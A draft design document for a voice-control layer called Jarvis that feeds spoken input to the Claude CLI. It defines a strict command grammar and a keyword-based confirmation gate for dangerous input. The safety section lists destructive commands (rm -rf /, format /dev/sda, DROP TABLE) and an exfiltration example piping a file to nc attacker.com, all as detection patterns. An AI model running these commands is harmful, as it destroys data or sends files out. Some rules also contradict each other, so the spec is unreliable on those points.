# JARVIS-DEC-003: Command Grammar & Safety Model

**Status**: DRAFT (awaiting review)
**Date**: 2025-12-28
**Scope**: Layer 0 - Foundational Concepts

---

## Overview

JARVIS-DEC-003 defines **command grammar** (how user controls Jarvis) and **safety gates** (how Jarvis prevents destructive actions).

Core principle: **Commands are deterministic, not semantic**. Jarvis never guesses intent. User intent is always explicit.

---

## Core Concept: Commands vs Voice Input

```
┌─────────────────────────────────────────────────────┐
│  USER SAYS TEXT                                     │
└──────────────┬──────────────────────────────────────┘
               │
               ↓
        ┌──────────────┐
        │ Is this a    │
        │ COMMAND?     │
        │ (exact       │
        │  match to    │
        │  grammar)    │
        └──────┬───────┘
               │
      ┌────────┴────────┐
      ↓                 ↓
    YES               NO
    │                 │
    ↓                 ↓
┌──────────────┐  ┌──────────────────┐
│ PROCESS      │  │ TREAT AS VOICE   │
│ AS COMMAND   │  │ INPUT            │
│              │  │ → Send to Claude │
│ - Check      │  │   (with mode)    │
│   safety     │  │                  │
│ - Execute    │  │ (Claude will     │
│ - Return UI  │  │  decide to      │
│   feedback   │  │  execute)       │
└──────────────┘  └──────────────────┘
```

---

## Command vs Voice Input

**COMMAND**:
- Exact match to known grammar
- Example: `"mode coding"`, `"kirim"`, `"ringkas"`
- Jarvis processes immediately (doesn't send to Claude)
- Jarvis provides direct feedback

**VOICE INPUT**:
- Anything that doesn't match command grammar
- Example: `"build a function"`, `"what's the bug"`, `"mode coding test"` (last one: misspoke, doesn't match exactly)
- Jarvis wraps with mode, sends to Claude CLI
- Claude CLI decides what to do

---

## Command Grammar (STRICT & DETERMINISTIC)

### Grammar Rules

**Rule 1: Exact or Prefix Match**

```
Command grammar supports TWO match styles:

EXACT MATCH:
  kirim → exact match only
  User: "kirim" → MATCH
  User: "send" → NO MATCH
  User: "kirim test" → NO MATCH

PREFIX MATCH:
  mode <X> → "mode" is prefix, <X> is variable
  User: "mode coding" → MATCH (mode=coding)
  User: "mode debug" → MATCH (mode=debug)
  User: "mode" → NO MATCH (missing <X>)
  User: "moding" → NO MATCH (not "mode" exactly)
```

**Rule 2: Case Insensitive**

```
Commands are case-insensitive (for voice tolerance):
  "KIRIM" → same as "kirim"
  "Mode Coding" → same as "mode coding"
  "JELASKAN" → same as "jelaskan"

BUT: Variables preserve casing
  "mode CODING" → mode=CODING (variable is "CODING")
  "mode coding" → mode=coding (variable is "coding")
```

**Rule 3: Whitespace Flexible**

```
Leading/trailing whitespace ignored:
  " kirim " → "kirim"
  "  mode coding  " → "mode coding"

Multiple spaces between words → single space:
  "mode  coding" (2 spaces) → "mode coding"
  "ulang   test" (3 spaces) → "ulang" (mismatched, ignored)
```

**Rule 4: No Semantic Guessing**

```
Jarvis DOES NOT guess intent:

User: "send"        → NOT recognized (should be "kirim")
User: "set mode"    → NOT recognized (should be "mode X")
User: "clear"       → NOT recognized (no such command)
User: "hlep"        → NOT recognized (misspelling of help)

Jarvis simply: "Command not recognized. Did you mean...?"
```

---

## Supported Commands (MVP)

### 1. `kirim` (Send)

**Purpose**: Press Enter in Claude CLI

**Syntax**: `kirim`

**Behavior**:
```
User: "kirim"
Jarvis:
  1. Press Enter in Claude CLI
  2. Display toast: "Sent ✓"
  3. Return to input ready state
```

**Use case**: User completes voice input, wants to send to Claude

---

### 2. `ulang` (Resend)

**Purpose**: Resend last transcribed text without re-recording

**Syntax**: `ulang`

**Behavior**:
```
User: "ulang"
Jarvis:
  1. Check last_transcription in session state
  2. If exists:
     - Send text to Claude CLI again
     - Display: "Resent: {text}"
  3. If not exists:
     - Display: "Nothing to resend"
```

**Use case**: User realizes they need to resend the same input

---

### 3. `ringkas` (Summarize)

**Purpose**: Request summary of last Claude response

**Syntax**: `ringkas`

**Behavior**:
```
User: "ringkas"
Jarvis:
  1. Display toast: "Requesting summary..."
  2. Send to Claude: "[COMMAND] summarize your last response"
  3. Wait for Claude response
  4. Display: "Done ✓"
```

**Use case**: User wants a shorter version of Claude's output

**Note**: This is Phase 2 (requires auxiliary LLM or Claude integration)
         MVP: just display "Not yet implemented"

---

### 4. `jelaskan` (Explain)

**Purpose**: Request explanation of last Claude response

**Syntax**: `jelaskan`

**Behavior**:
```
User: "jelaskan"
Jarvis:
  1. Display toast: "Requesting explanation..."
  2. Send to Claude: "[COMMAND] explain your last response in simpler terms"
  3. Wait for Claude response
```

**Use case**: User doesn't understand previous Claude output

**Note**: Phase 2 feature, MVP: "Not yet implemented"

---

### 5. `mode <X>` (Set Mode)

**Purpose**: Change Jarvis mode (affects prompt shaping)

**Syntax**: `mode <MODE>` where MODE is one of: `default`, `coding`, `debug`, `explain`

**Behavior**:
```
User: "mode coding"
Jarvis:
  1. Set Jarvis.mode = "coding"
  2. Display overlay: "🔵 CODING MODE"
  3. Do NOT send text to Claude

User: "mode default"
Jarvis:
  1. Set Jarvis.mode = "default"
  2. Display overlay: "NORMAL MODE"

User: "mode invalid"
Jarvis:
  1. Display error: "Unknown mode 'invalid'. Modes: default, coding, debug, explain"
  2. Keep current mode
```

**Use case**: User wants to switch context (dev mode vs regular mode)

---

### 6. `help` (Help)

**Purpose**: Display available commands

**Syntax**: `help`

**Behavior**:
```
User: "help"
Jarvis:
  1. Display help overlay:
     ┌─────────────────────────────────┐
     │ JARVIS COMMANDS                 │
     │                                 │
     │ kirim    - Send to Claude       │
     │ ulang    - Resend last input    │
     │ ringkas  - Summarize (Phase 2)  │
     │ jelaskan - Explain (Phase 2)    │
     │ mode X   - Set mode             │
     │ help     - Show this help       │
     │                                 │
     │ Modes: default, coding,         │
     │        debug, explain           │
     │                                 │
     │ Press F12 to return             │
     └─────────────────────────────────┘
```

**Use case**: User forgets available commands

---

## Command Parsing Algorithm

```python
def parse_input(text: str) -> Union[Command, VoiceInput]:
    """
    Parse user input as command or voice input
    """
    # Normalize
    normalized = text.strip().lower()

    # Try exact matches
    if normalized == "kirim":
        return Command("send")
    elif normalized == "ulang":
        return Command("resend")
    elif normalized == "ringkas":
        return Command("summarize")
    elif normalized == "jelaskan":
        return Command("explain")
    elif normalized == "help":
        return Command("help")

    # Try prefix matches
    elif normalized.startswith("mode "):
        mode_name = normalized[5:].strip()  # extract after "mode "
        if mode_name in ["default", "coding", "debug", "explain"]:
            return Command("set_mode", mode=mode_name)
        else:
            return Command("error_unknown_mode", mode=mode_name)

    # Not a command → treat as voice input
    else:
        return VoiceInput(normalized)
```

---

## Safety Model: Keyword-Based Detection

### Critical Implementation Rule

**⚠️ Safety scanning applies ONLY to non-command voice input, NOT to command parsing.**

```
Flow:
  User input received
  ↓
  → Is this a command? (exact/prefix match)
     ├─ YES → Process as command (NO safety scan)
     └─ NO → Treat as voice input
            → Apply safety scan
            → If dangerous: show confirmation gate
            → If safe: send to Claude
```

Rationale: Commands are structured and user-intentional (e.g., "kirim", "mode coding"). Voice input is free-form and may accidentally contain dangerous patterns (e.g., "explain how to rm -rf"). Safety gates protect against accidental dangerous voice commands, not intentional structured commands.

---

### Safety Pattern Categories

**Category 1: Destructive File Operations**

```
Patterns: rm, del, unlink, erase, remove, delete
Variants:
  - "rm -rf /" → DANGER
  - "del /f /s C:\" → DANGER
  - "unlink /home/user/*" → DANGER
  - "remove everything" → Ambiguous (may not be command)

Jar vis Response:
  ⚠️ SAFETY GATE ENGAGED
  "Destructive command detected: rm -rf
   Continue? [Y/N]"
```

**Category 2: Git Reset / Force Operations**

```
Patterns: git reset, git rebase, git push --force, git force
Variants:
  - "git reset --hard" → DANGER
  - "git push --force" → DANGER
  - "git rebase -i" → CAUTION (not always destructive)

Jarvis Response:
  ⚠️ SAFETY GATE ENGAGED
  "Git destructive operation detected: git reset --hard
   Continue? [Y/N]"
```

**Category 3: System/Database Destruction**

```
Patterns: DROP TABLE, DROP DATABASE, TRUNCATE, shutdown, reboot, format
Variants:
  - "DROP TABLE users" → DANGER
  - "format /dev/sda" → DANGER
  - "shutdown -h now" → DANGER
  - "TRUNCATE logs" → DANGER

Jarvis Response:
  ⚠️ SAFETY GATE ENGAGED
  "System destructive operation detected: DROP TABLE
   Continue? [Y/N]"
```

**Category 4: Unintended Command Injections**

```
Patterns: `backticks`, $(commands), ;multiple;commands, &&chain, |pipe
Variants:
  - "echo `whoami`" → CAUTION (command substitution)
  - "cat file.txt | nc attacker.com" → DANGER (data exfiltration)

Jarvis Response:
  ⚠️ SAFETY GATE: Suspicious command structure detected
   "echo `whoami`"
   Continue? [Y/N]"
```

---

### Safety Gate Implementation

```python
class SafetyGate:
    """
    Keyword-based safety detection
    """

    DESTRUCTIVE_PATTERNS = {
        "file": ["rm", "del", "unlink", "erase", "remove"],
        "git": ["git reset", "git push --force", "git rebase"],
        "database": ["drop table", "drop database", "truncate"],
        "system": ["shutdown", "reboot", "format", "dd"],
    }

    def detect_dangerous_operation(self, text: str) -> Optional[str]:
        """
        Returns danger category if detected, None otherwise
        """
        text_lower = text.lower()

        for category, patterns in self.DESTRUCTIVE_PATTERNS.items():
            for pattern in patterns:
                if pattern in text_lower:
                    return category

        # Check for suspicious command structures
        if self._has_command_injection_risk(text):
            return "injection"

        return None

    def _has_command_injection_risk(self, text: str) -> bool:
        """Check for |, ;, &&, $(, ` patterns"""
        dangerous_chars = ['|', '&&', ';', '`', '$(']
        return any(char in text for char in dangerous_chars)

    def require_confirmation(self, operation: str) -> bool:
        """
        Display safety gate UI, return True if user confirms
        """
        # In implementation: show UI dialog
        return display_confirmation_dialog(
            f"Destructive operation detected:\n{operation}\n\nContinue? [Y/N]"
        )
```

---

## Safety Gate Behavior

### Flow

```
User says text → Jarvis transcribes
               → Is it a command? (exact/prefix match)
                  ├─ YES → Process as command
                  └─ NO → Treat as voice input (regular input)

               For voice input:
               → Scan for safety patterns
               → Found?
                  ├─ YES → Show confirmation dialog
                  │        Wait for Y/N
                  │        If Y: send to Claude CLI
                  │        If N: display "Canceled"
                  └─ NO → Apply mode, send to Claude CLI
```

### User Confirmation Formats

```
❌ User says "yes" or "yeah"
   → Jarvis: "Unrecognized command"
   → User must press Y key or click button

✅ User presses Y key
   → Confirmation accepted

✅ User clicks "Continue" button
   → Confirmation accepted

❌ User says "proceed" or "go ahead"
   → NOT recognized (must be explicit Y key)

❌ User doesn't respond within 30s
   → Confirmation timeout
   → Display: "Operation canceled (timeout)"
```

---

## Five Concrete Scenarios

### Scenario 1: Normal Voice Input (No Safety Issues)

```
User: [F12] "build a function that sorts an array"
Jarvis:
  1. Transcribe: "build a function that sorts an array"
  2. Parse: Not a command
  3. Safety check: No dangerous patterns found
  4. Apply mode (if mode=coding):
     → Wrap: "[CODING] build a function that sorts an array"
  5. Send to Claude CLI
  6. Display: "Sent ✓"

Result: ✅ Normal flow, no safety gates
```

### Scenario 2: Command Execution (kirim)

```
User: [F12] "what's the best practice"
Jarvis:
  1. Transcribe: "what's the best practice"
  2. Parse: Not a command (missing space for "kirim")
  3. Send to Claude with mode

User: "kirim"
Jarvis:
  1. Transcribe: "kirim"
  2. Parse: Exact match to "kirim" command
  3. Execute: Press Enter in Claude CLI
  4. Display: "Sent ✓"

Result: ✅ Command recognized and executed
```

### Scenario 3: Mode Change

```
User: "mode coding"
Jarvis:
  1. Transcribe: "mode coding"
  2. Parse: Prefix match to "mode <X>" (mode=coding)
  3. Execute: Set Jarvis.mode = "coding"
  4. Display overlay: "🔵 CODING MODE"
  5. Do NOT send to Claude

User: [F12] "build that function"
Jarvis:
  1. Transcribe: "build that function"
  2. Parse: Not a command
  3. Apply mode: Wrap "[CODING] build that function"
  4. Send to Claude CLI

Result: ✅ Mode persists, affects subsequent inputs
```

### Scenario 4: Safety Gate Triggered (Destructive Operation)

```
User: [F12] "remove all temp files with rm -rf /tmp"
Jarvis:
  1. Transcribe: "remove all temp files with rm -rf /tmp"
  2. Parse: Not a command
  3. Safety check: Pattern "rm -rf" detected → DANGER (file category)
  4. Display confirmation dialog:
     ┌────────────────────────────────┐
     │ ⚠️  DESTRUCTIVE OPERATION       │
     │                                │
     │ Detected: rm -rf /tmp          │
     │                                │
     │ Continue? [Y] [N]              │
     └────────────────────────────────┘
  5. Wait for user input

User: [presses Y]
  → Confirmation accepted
  → Send to Claude CLI
  → Display: "Sent ✓"

User: [presses N]
  → Confirmation rejected
  → Display: "Operation canceled"
  → Return to input ready state

Result: ⚠️ Safety gate prevents accidental dangerous commands
```

### Scenario 5: Command Not Recognized

```
User: "send"  (misspoke, should be "kirim")
Jarvis:
  1. Transcribe: "send"
  2. Parse: Not a command (no match to "kirim")
  3. Safety check: No dangerous patterns
  4. Apply mode, send to Claude CLI
  5. Claude receives: "send"

Result: ⚠️ User probably wanted command, but said it in English
        Jarvis sends to Claude, Claude may understand intent
        Or user learns to use "kirim" instead

Alternative (Phase 2):
  After "send" not recognized, display:
  "Did you mean 'kirim'? [Y/N]"
```

---

## Implementation Checkpoints

### Before MVP Release

- [ ] Command parser recognizes all 6 commands (exact/prefix match)
- [ ] Case-insensitive parsing
- [ ] Whitespace normalization
- [ ] Safety detection for 4 categories (file, git, database, system)
- [ ] Safety gate confirmation dialog implemented
- [ ] No auto-confirmation (explicit Y/N required)
- [ ] Safety gate timeout: 30s, cancels on timeout
- [ ] Clear error messages ("Command not recognized")
- [ ] Help command displays all available commands

### Phase 2 (Optional)

- [ ] `ringkas` command (summarize)
- [ ] `jelaskan` command (explain)
- [ ] Fuzzy matching suggestions ("Did you mean...?")
- [ ] Custom command definitions (advanced users)
- [ ] Safety pattern customization

---

## Non-Negotiable Constraints

✅ **MUST HAVE**:
- Strict deterministic grammar (exact/prefix match only)
- No semantic guessing
- Case-insensitive but variable-preserving
- Safety detection for destructive operations
- Explicit user confirmation (Y/N, no voice "yes")
- Clear error messages on command failure
- Help command listing all commands

❌ **MUST NOT HAVE**:
- Fuzzy intent detection in MVP
- Auto-confirmation of dangerous operations
- Natural language understanding of commands
- Semantic guessing ("did you mean...")
- Silent fallbacks to voice input (show error)
- Voice confirmation (must be explicit Y key)
- Commands that don't match grammar

---

## Command Grammar Summary

| Command | Syntax | Match Type | Sends to Claude | Safe? |
|---------|--------|-----------|-----------------|-------|
| kirim | kirim | exact | ❌ No | ✅ N/A |
| ulang | ulang | exact | ❌ No | ✅ N/A |
| ringkas | ringkas | exact | ⚠️ Phase 2 | ✅ N/A |
| jelaskan | jelaskan | exact | ⚠️ Phase 2 | ✅ N/A |
| mode | mode <X> | prefix | ❌ No | ✅ N/A |
| help | help | exact | ❌ No | ✅ N/A |
| Voice Input | any other | - | ✅ Yes | ⚠️ Safety checked |

---

## Safety Pattern Table

| Category | Patterns | Risk Level | Confirmation |
|----------|----------|-----------|---------------|
| File Operations | rm, del, unlink | HIGH | Required |
| Git Destructive | git reset, git push --force | HIGH | Required |
| Database | DROP, TRUNCATE | CRITICAL | Required |
| System | shutdown, reboot, format | CRITICAL | Required |
| Command Injection | \|, &&, \`, $( | HIGH | Required |

---

## Relationship to Other Layers

**Layer 1 (Contracts)**:
- Command contract defines SDK input types
- Safety gates define permission boundaries

**Layer 2 (Architecture)**:
- Command grammar affects Input Orchestrator routing
- Safety gates affect decision flow

**Layer 3 (Implementation)**:
- Parser implementation, regex patterns
- Safety detector patterns, confirmation UI

---

## Summary Table

| Aspect | Decision | Rationale |
|--------|----------|-----------|
| Grammar | STRICT exact/prefix | No semantic guessing |
| Case | Insensitive | Voice tolerance |
| Whitespace | Flexible | Voice tolerance |
| Confirmation | Explicit Y/N key | Prevent accidents |
| Timeout | 30s | User attention span |
| Categories | 5 (file, git, DB, system, injection) | Common dangers |

---

**Layer 0 Complete**: All three foundational documents ready for review

